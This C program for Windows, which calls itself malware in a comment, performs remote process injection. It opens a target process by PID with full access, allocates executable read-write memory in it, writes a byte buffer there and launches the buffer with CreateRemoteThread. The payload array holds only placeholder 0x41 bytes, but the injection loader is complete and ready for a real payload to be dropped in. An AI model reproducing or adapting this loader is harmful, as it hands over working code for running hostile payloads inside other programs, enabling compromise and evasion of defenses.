#include <windows.h> //Believe it or not, this malware is for Windows. (shocking)
#include <stdio.h>

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess = NULL;
HANDLE hThread = NULL;

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

unsigned char aids[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char* argv[]) {
    if(argc < 2) {
        printf("%s usage: %s <PID>", e, argv[0]);
        return -1;
    }

    PID = atoi(argv[1]);
    printf("%s trying to open a handle to process (%ld)\n", i, PID);

    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID
    );

    if(hProcess == NULL) {
        printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
        return -1;
    }

    printf("%s Got a handle to the process!\n\\---0x%p\n", k, hProcess);

    /*Allocate bytes to process memory*/
    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(aids),
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE
    );

    printf("%s allocated %zu-bytes with rwx permissions.\n", k, sizeof(aids));

    /*Write that allocated memory to process mem*/
    WriteProcessMemory(
        hProcess,
        rBuffer,
        aids,
        sizeof(aids),
        NULL
    );
    
    printf("%s Wrote %zu-bytes to process memory\n", k, sizeof(aids));

    /*create thread to run payload*/
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer,
        NULL,
        0,
        &TID
    );

    if(hThread == NULL) {
        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return -1;
    }

    printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);

    printf("%s waiting for thread to finish...", i);    
    WaitForSingleObject(
        hThread,
        INFINITE
    );
    printf("%s Thread has finished executing\n", k);

    printf("%s cleaning up\n", i);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s Complete, see you l8r nerd\n", k);
    return 0;
}